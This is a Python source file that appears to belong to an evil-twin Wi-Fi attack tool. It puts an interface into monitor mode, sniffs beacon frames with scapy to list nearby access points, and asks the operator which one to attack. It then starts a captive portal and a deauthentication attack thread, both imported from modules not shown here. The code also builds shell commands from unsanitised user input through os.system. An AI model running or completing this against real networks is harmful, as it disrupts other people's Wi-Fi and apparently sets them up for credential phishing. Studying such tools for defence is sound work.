import Deauthentication as deauth
from CaptivePortal import CaptivePortal as CP
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt

ap_list = []
ESSID = 0
BSSID = 1
CHANNEL = 2
essids_set = set()


def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        # switch channel in range [1,14] each 0.5 seconds
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


def ap_scan_pkt(pkt):
    # We are interested only in Beacon frame
    # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
    if pkt.haslayer(Dot11Beacon):
        # Get the source MAC address - BSSID of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = pkt[Dot11Elt].info.decode()
        # Check if the new found AP is already in the AP set
        if essid not in essids_set:
            essids_set.add(essid)
            # network_stats() function extracts some useful information from the network - such as the channel
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            # Add the new found AP to the AP list
            ap_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))


# ## After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as
# the choosen AP.
def set_channel(channel):
    os.system('iwconfig %s channel %d' % (interface, channel))


def networks_scan():
    global search_timeout
    search_timeout = 60
    # search_timeout = int(input(G + "Please enter the scanning time frame in seconds: "))
    channel_changer = Thread(target=change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    print("\n Scanning for networks...\n")
    # Sniffing packets - scanning the network for AP in the area
    # iface – the interface that is in monitor mode
    # prn – function to apply to each packet
    # timeout – stop sniffing after a given time
    sniff(iface=interface, prn=ap_scan_pkt, timeout=search_timeout)
    num_of_ap = len(ap_list)
    # If at least one AP was found, print all the found APs
    if num_of_ap > 0:
        # If at least 1 AP was found.
        print("\n*************** APs Table ***************\n")
        for x in range(num_of_ap):
            print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(
                ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID])
        print("\n************* FINISH SCANNING *************\n")
        # Choosing the AP to attack
        ap_index = int(input("Please enter the number of the AP you want to attack: "))
        # Print the choosen AP
        print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(
            ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
        # Set the channel as the choosen AP channel in order to send packets to connected clients later
        set_channel(int(ap_list[ap_index][CHANNEL]))
        # Save all the needed information about the choosen AP
        global ap_mac
        global ap_name
        global ap_channel
        ap_mac = ap_list[ap_index][BSSID]
        ap_name = ap_list[ap_index][ESSID]
        ap_channel = ap_list[ap_index][CHANNEL]
        '''
        data = {}
        data['AP'] = []
        data['AP'].append({
            'name': ap_name,
            'chnnel': ap_channel,
            'mac': ap_mac
            })
        with open('data.txt', 'w') as outfile:
            json.dump(data, outfile)
            '''
        # client_scan_rap()
    else:
        # If no AP was found.
        rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print("  Sorry :(  ")
            deactivate_monitor()
            sys.exit(0)
        else:
            networks_scan()


def users_scan():
    pass


def activate_monitor():
    global interface
    print("*** Step 1:  Choosing an interface to put in 'monitor mode'. *** \n")
    empty = input("Press Enter to continue.........")
    os.system('ifconfig')
    interface = input("Please enter the interface name you want to put in 'monitor mode': ")
    # Put the choosen interface in 'monitor mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')
    # os.system('iwconfig') # Check


def deactivate_monitor():
    print("\n*** Step 5: Put the interface back in 'managed mode'. *** \n")
    empty = input("Press Enter in order to put " + interface + " in 'managed mode' .........")
    # Put the choosen interface back in 'managed mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print("[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    # os.system('iwconfig')


def start(self, user, network):
    CP.start()
    deauthAttack = threading.Thread(target=deauth.start, args=(user, network))
    deauthAttack.start()
    deauthAttack.join()
    self.deactivate_monitor()
